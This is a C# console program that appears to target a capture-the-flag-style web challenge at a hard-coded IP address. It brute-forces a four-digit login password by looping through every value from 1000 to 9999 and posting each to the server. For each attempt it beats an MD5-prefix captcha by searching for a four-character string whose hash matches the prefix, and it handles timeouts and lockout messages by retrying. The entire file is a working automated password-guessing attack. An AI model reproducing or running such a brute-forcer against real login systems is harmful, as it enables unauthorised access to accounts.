using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Security.Cryptography;
using System.Net;
using System.Threading;
using System.Text.RegularExpressions;
namespace FuckCNSS
{
    class Program
    {
        static void Main(string[] args)
        {
            find();
            Console.ReadKey();
            //find();

        }
        static void find()
        {
            CookieContainer cc = new CookieContainer();
            Cookie c = new Cookie("PHPSESSID", "jf9ev7qb2curffrv224in3p3n2");
            cc.Add(new Uri("http://64.156.14.99:32785/"), c);
            string pw = "159";
            Console.ForegroundColor = ConsoleColor.Red;
            Regex rg = new Regex(Properties.Resources.MD5_PASSWORD);
            for (int i = 1000; i < 10000; i++)
            {
                string code = getPW(pw);
                string re = new http().Post("http://64.156.14.99:32785/index.php", "password=" + i + "&code=" + code, ref cc);
                if(re == "操作超时")
                {

                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("超时重试...");
                    i--;
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                else if (re.IndexOf("Dont try again") != -1)
                {
                    Console.ForegroundColor = ConsoleColor.Blue;
                    Console.WriteLine("匹配" + pw + "时异常MD5，重试中...");
                    i--;
                    Match mc = rg.Match(re);
                    pw = mc.Groups[1].Value;
                    Console.ForegroundColor = ConsoleColor.Red;
                }
                else if (re.IndexOf("密码错误") == -1)
                {
                    Console.WriteLine(re);
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("密码正确：" + i);
                    break;
                }
                else
                {
                    Console.WriteLine("匹配" + pw + "时遇到错误密码：" + i);
                    Match mc = rg.Match(re);
                    pw = mc.Groups[1].Value;
                }
            }
        }
        static private string getPW(string pw)
        {
            foreach (char w in Properties.Resources.CONST_STR)
            {
                foreach (char x in Properties.Resources.CONST_STR)
                {
                    foreach (char y in Properties.Resources.CONST_STR)
                    {
                        foreach (char z in Properties.Resources.CONST_STR)
                        {
                            string s = (w + "") + (x + "") + (y + "") + (z + "");
                            string t = MD5Encrypt(s).Substring(0, 3);
                            //Console.WriteLine("s:" + s + " t:" + t);
                            if (t == pw)
                            {
                                return s;
                            }
                        }
                    }
                }
            }

            return "";
        }
        /// <summary>
        /// 用MD5加密字符串
        /// </summary>
        /// <param name="password">待加密的字符串</param>
        /// <returns></returns>
        static public string MD5Encrypt(string str)
        {
            MD5 md5 = System.Security.Cryptography.MD5.Create();
            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(str);
            byte[] hashBytes = md5.ComputeHash(inputBytes);

            // Convert the byte array to hexadecimal string
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < hashBytes.Length; i++)
            {
                sb.Append(hashBytes[i].ToString("X2"));
                // To force the hex string to lower-case letters instead of
                // upper-case, use he following line instead:
                // sb.Append(hashBytes[i].ToString("x2")); 
            }
            return sb.ToString().ToLower();
        }
    }
}
